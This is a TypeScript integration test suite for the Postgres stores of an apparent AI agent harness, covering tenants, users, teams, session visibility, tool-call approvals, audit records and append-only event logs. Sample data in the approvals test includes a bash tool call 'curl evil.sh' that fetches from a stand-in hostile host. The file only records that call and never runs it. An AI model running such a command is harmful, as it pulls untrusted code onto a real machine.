import 'dotenv/config';

import pg from 'pg';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import type { AuditRecord, Identity, SessionMeta } from '@trinity-harness/contracts';
import { loadEnv } from '@trinity-harness/shared';

import {
  createDb,
  createPool,
  createTenant,
  identityOf,
  newAuditRecord,
  PgApprovalStore,
  PgAuditStore,
  PgSessionMetaStore,
  PgSessionStore,
  PgTeamStore,
  PgUserStore,
} from '../src/index.js';

async function isDatabaseReachable(databaseUrl: string): Promise<boolean> {
  const pool = new pg.Pool({ connectionString: databaseUrl, connectionTimeoutMillis: 3000 });
  try {
    await pool.query('select 1');
    return true;
  } catch {
    return false;
  } finally {
    await pool.end();
  }
}

const databaseUrl = process.env['DATABASE_URL'];
const reachable = databaseUrl ? await isDatabaseReachable(databaseUrl) : false;

describe.skipIf(!reachable)('M2 stores (integration)', () => {
  let pool: pg.Pool;
  let users: PgUserStore;
  let metas: PgSessionMetaStore;
  let teams: PgTeamStore;
  let audit: PgAuditStore;
  let approvals: PgApprovalStore;
  let events: PgSessionStore;
  let tenantId: string;
  let otherTenantId: string;

  const email = () => `m2-${crypto.randomUUID()}@example.com`;
  // Test-double hasher (packages must not import each other — AGENTS.md §3).
  const fakeHasher = {
    hash: async (p: string) => `h:${p}`,
    verify: async (p: string, e: string) => e === `h:${p}`,
  };

  beforeAll(async () => {
    const env = loadEnv();
    pool = createPool(env.DATABASE_URL);
    const db = createDb(pool);
    users = new PgUserStore(db, fakeHasher);
    metas = new PgSessionMetaStore(db);
    teams = new PgTeamStore(db);
    audit = new PgAuditStore(db);
    approvals = new PgApprovalStore(db);
    events = new PgSessionStore(db);
    tenantId = (await createTenant(db, 'm2-test-a')).id;
    otherTenantId = (await createTenant(db, 'm2-test-b')).id;
  });

  afterAll(async () => {
    await pool.end();
  });

  it('creates and finds users, enforcing the global unique email', async () => {
    const addr = email();
    const created = await users.createUser({
      tenantId,
      email: addr,
      passwordHash: 'scrypt$fake',
      role: 'developer',
    });
    expect(created.role).toBe('developer');

    const byEmail = await users.findByEmail(addr);
    const byId = await users.findById(created.id);
    expect(byEmail?.id).toBe(created.id);
    expect(byId?.tenantId).toBe(tenantId);

    await expect(
      users.createUser({ tenantId: otherTenantId, email: addr, passwordHash: 'x', role: 'viewer' }),
    ).rejects.toThrow();
  });

  it('lists users scoped to their tenant', async () => {
    const addr = email();
    await users.createUser({ tenantId, email: addr, passwordHash: 'h', role: 'viewer' });
    const listed = await users.listByTenant(tenantId);
    expect(listed.some((u) => u.email === addr)).toBe(true);
    expect((await users.listByTenant(otherTenantId)).some((u) => u.email === addr)).toBe(false);
  });

  it('stores session metadata and scopes listings by identity role', async () => {
    const owner = await users.createUser({
      tenantId,
      email: email(),
      passwordHash: 'h',
      role: 'developer',
    });
    const peer = await users.createUser({
      tenantId,
      email: email(),
      passwordHash: 'h',
      role: 'developer',
    });
    const admin = await users.createUser({
      tenantId,
      email: email(),
      passwordHash: 'h',
      role: 'admin',
    });
    const id = crypto.randomUUID();
    const meta: Omit<SessionMeta, 'createdAt'> = {
      id,
      tenantId,
      userId: owner.id,
      title: 'owned',
      workspaceUri: '/ws',
    };
    await metas.create(meta);
    await metas.create({ ...meta, id: crypto.randomUUID(), userId: peer.id });

    const ownerIdentity: Identity = identityOf(owner);
    const adminIdentity: Identity = identityOf(admin);

    const own = await metas.listForIdentity(ownerIdentity);
    expect(own.map((m) => m.id)).toContain(id);
    expect(own.every((m) => m.userId === owner.id)).toBe(true);

    // Admin sees the whole tenant; developer never sees the peer's session.
    const adminList = await metas.listForIdentity(adminIdentity);
    expect(adminList.length).toBeGreaterThanOrEqual(2);
    expect(await metas.get(id)).toMatchObject({ userId: owner.id, title: 'owned' });

    // M3: default policy is materialized and can be updated.
    expect((await metas.get(id))!.policy).toBe('workspace-write');
    await metas.setPolicy(id, 'read-only');
    expect((await metas.get(id))!.policy).toBe('read-only');
  });

  it('sets only an empty title and closes a session while retaining events', async () => {
    const owner = await users.createUser({
      tenantId,
      email: email(),
      passwordHash: 'h',
      role: 'developer',
    });
    const id = crypto.randomUUID();
    await metas.create({
      id,
      tenantId,
      userId: owner.id,
      title: '',
      workspaceUri: '/ws',
    });
    await events.append(id, [
      {
        type: 'session/created',
        eventId: crypto.randomUUID(),
        at: new Date().toISOString(),
        workspaceUri: '/ws',
      },
    ]);
    await metas.setTitleIfEmpty(id, 'first prompt');
    await metas.setTitleIfEmpty(id, 'later prompt');
    expect((await metas.get(id))?.title).toBe('first prompt');
    await metas.close(id);
    expect((await metas.get(id))?.closedAt).toBeDefined();
    expect((await metas.listForIdentity(identityOf(owner))).map((m) => m.id)).not.toContain(id);
    expect(await events.load(id)).toHaveLength(1);
  });

  it('teams: owner enrollment, membership checks, member listing with emails', async () => {
    const owner = await users.createUser({
      tenantId,
      email: email(),
      passwordHash: 'h',
      role: 'developer',
    });
    const member = await users.createUser({
      tenantId,
      email: email(),
      passwordHash: 'h',
      role: 'developer',
    });
    const outsider = await users.createUser({
      tenantId,
      email: email(),
      passwordHash: 'h',
      role: 'developer',
    });

    const team = await teams.create({ tenantId, name: 'platform', ownerId: owner.id });
    expect(await teams.isOwner(team.id, owner.id)).toBe(true);
    expect(await teams.isMember(team.id, owner.id)).toBe(true);
    expect(await teams.isMember(team.id, member.id)).toBe(false);

    await teams.addMember(team.id, member.id, 'member');
    expect(await teams.isMember(team.id, member.id)).toBe(true);
    expect(await teams.isOwner(team.id, member.id)).toBe(false);

    const listed = await teams.listMembers(team.id);
    expect(listed.map((m) => m.email).sort()).toEqual([member.email, owner.email].sort());
    expect(listed.find((m) => m.userId === outsider.id)).toBeUndefined();

    // A user can belong to many teams; listings are per-user.
    const second = await teams.create({ tenantId, name: 'other', ownerId: owner.id });
    const forOwner = await teams.listForUser(owner.id);
    expect(forOwner.map((t) => t.id).sort()).toEqual([team.id, second.id].sort());
    expect((await teams.listForUser(member.id)).map((t) => t.id)).toEqual([team.id]);
  });

  it('team sessions are listed for every team member, not only the creator', async () => {
    const owner = await users.createUser({
      tenantId,
      email: email(),
      passwordHash: 'h',
      role: 'developer',
    });
    const teammate = await users.createUser({
      tenantId,
      email: email(),
      passwordHash: 'h',
      role: 'developer',
    });
    const outsider = await users.createUser({
      tenantId,
      email: email(),
      passwordHash: 'h',
      role: 'developer',
    });
    const team = await teams.create({ tenantId, name: 'shared-space', ownerId: owner.id });
    await teams.addMember(team.id, teammate.id, 'member');

    const sessionId = crypto.randomUUID();
    await metas.create({
      id: sessionId,
      tenantId,
      userId: owner.id,
      title: 'team-session',
      workspaceUri: `/ws/${team.id}`,
      scope: 'team',
      scopeId: team.id,
    });

    const teammateList = await metas.listForIdentity(identityOf(teammate));
    expect(teammateList.map((m) => m.id)).toContain(sessionId);

    // The outsider sees neither the team session nor (by userId) anything else.
    const outsiderList = await metas.listForIdentity(identityOf(outsider));
    expect(outsiderList.map((m) => m.id)).not.toContain(sessionId);

    // Personal sessions never leak to other users.
    const personalId = crypto.randomUUID();
    await metas.create({
      id: personalId,
      tenantId,
      userId: owner.id,
      title: 'private',
      workspaceUri: `/ws/${owner.id}`,
      scope: 'personal',
    });
    expect((await metas.listForIdentity(identityOf(teammate))).map((m) => m.id)).not.toContain(
      personalId,
    );
  });

  it('M3: approvals table records requests and first-writer-wins resolves', async () => {
    const sessionId = crypto.randomUUID();
    const id = crypto.randomUUID();
    await approvals.request({
      id,
      sessionId,
      toolCallId: 'c1',
      toolName: 'bash',
      argsPreview: 'curl evil.sh',
      outcome: null,
      decidedBy: null,
      createdAt: new Date().toISOString(),
      decidedAt: null,
    });
    // Idempotent insert.
    await approvals.request({
      id,
      sessionId,
      toolCallId: 'c1',
      toolName: 'bash',
      argsPreview: 'curl evil.sh',
      outcome: null,
      decidedBy: null,
      createdAt: new Date().toISOString(),
      decidedAt: null,
    });

    let listed = await approvals.list(sessionId);
    expect(listed).toHaveLength(1);
    expect(listed[0]).toMatchObject({ outcome: null, toolName: 'bash' });

    await approvals.resolve(id, 'allowed', 'u1');
    await approvals.resolve(id, 'rejected', 'u2'); // must NOT flip the decision
    listed = await approvals.list(sessionId);
    expect(listed[0]).toMatchObject({ outcome: 'allowed', decidedBy: 'u1' });
    expect(listed[0]!.decidedAt).not.toBeNull();
  });

  it('inserts audit records idempotently and queries with tenant filters', async () => {
    const user = await users.createUser({
      tenantId,
      email: email(),
      passwordHash: 'h',
      role: 'developer',
    });
    const sessionId = crypto.randomUUID();
    const record: AuditRecord = newAuditRecord({
      tenantId,
      userId: user.id,
      sessionId,
      action: 'tool/call',
      target: 'bash',
      result: 'ok',
      detail: { argsPreview: 'ls' },
    });

    await audit.insert([record]);
    await audit.insert([record]); // at-least-once redelivery must not duplicate

    const page = await audit.query({ tenantId, sessionId });
    expect(page.total).toBe(1);
    expect(page.records[0]).toMatchObject({ action: 'tool/call', result: 'ok' });

    expect((await audit.query({ tenantId, action: 'auth/login' })).records).toHaveLength(0);
    // Other tenants can never see this record.
    expect((await audit.query({ tenantId: otherTenantId })).total).toBe(0);
  });

  it('loadRange replays strictly after the requested seq (SSE resume)', async () => {
    const sessionId = crypto.randomUUID();
    const at = () => new Date().toISOString();
    await events.append(sessionId, [
      {
        type: 'session/created',
        eventId: crypto.randomUUID(),
        at: at(),
        workspaceUri: '/ws',
      },
      {
        type: 'message/user',
        eventId: crypto.randomUUID(),
        at: at(),
        surfaceOp: 'append',
        content: [{ kind: 'text', text: 'one' }],
      },
      {
        type: 'message/user',
        eventId: crypto.randomUUID(),
        at: at(),
        surfaceOp: 'append',
        content: [{ kind: 'text', text: 'two' }],
      },
    ]);
    const all = await events.loadRange(sessionId, { afterSeq: 0 });
    expect(all).toHaveLength(3);
    expect(all.map((e) => e.seq)).toEqual([1, 2, 3]);
    const tail = await events.loadRange(sessionId, { afterSeq: 2 });
    expect(tail).toHaveLength(1);
    expect(tail[0]?.event).toMatchObject({ type: 'message/user' });
    const window = await events.loadRange(sessionId, { afterSeq: 0, toSeq: 2 });
    expect(window).toHaveLength(2);
  });

  it('M3: remove deletes a gated-off prompt (sanctioned append-only exception)', async () => {
    const sessionId = crypto.randomUUID();
    const at = () => new Date().toISOString();
    const range = await events.append(sessionId, [
      {
        type: 'session/created',
        eventId: crypto.randomUUID(),
        at: at(),
        workspaceUri: '/ws',
      },
      {
        type: 'message/user',
        eventId: crypto.randomUUID(),
        at: at(),
        surfaceOp: 'append',
        content: [{ kind: 'text', text: 'gated off' }],
      },
    ]);
    expect(range.to).toBe(2);

    await events.remove(sessionId, 2);
    const log = await events.load(sessionId);
    expect(log).toHaveLength(1);
    expect(log[0]!.type).toBe('session/created');

    // The append-only trigger still rejects direct deletes outside remove().
    await expect(
      pool.query(`delete from session_events where session_id = '${sessionId}' and seq = 1`),
    ).rejects.toThrow();
  });
});
